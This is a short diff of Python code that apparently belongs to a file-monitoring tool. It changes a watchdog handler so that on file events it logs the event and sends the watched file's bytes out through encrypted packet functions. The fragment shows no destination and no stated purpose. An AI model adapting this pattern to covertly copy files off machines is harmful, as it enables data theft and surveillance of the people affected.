@@ -131,14 +131,25 @@ def transfer_file(file):
 ### MONITOR (FILE) ########################################################################
 ###########################################################################################
 class MonitorFile(FileSystemEventHandler):
-    def on_modified(self, event):
+    def on_any_event(self, event):
+        if event.is_directory:
+            return
+
         log = datetime.now().strftime("%Y-%m-%d_%H:%M:%S_") + str(event) + "\n"
         send_packet_flog(log)
 
-        time.sleep(0.1)
-        with open(PATH_FILE, "rb") as f:
-            data = f.read()
-            send_packet_file(data)
+        fname = os.path.basename(event.src_path)
+
+        if event.event_type == "closed":
+            time.sleep(0.1)
+            with open(PATH_FILE, "rb") as f:
+                data = f.read()
+                send_packet_file(data)
+        elif event.event_type == "modified":
+            time.sleep(0.1)
+            with open(PATH_FILE, "rb") as f:
+                data = f.read()
+                send_packet_file(data)
 
 def send_packet_flog(data):
     enc_data = encrypt(data.encode())
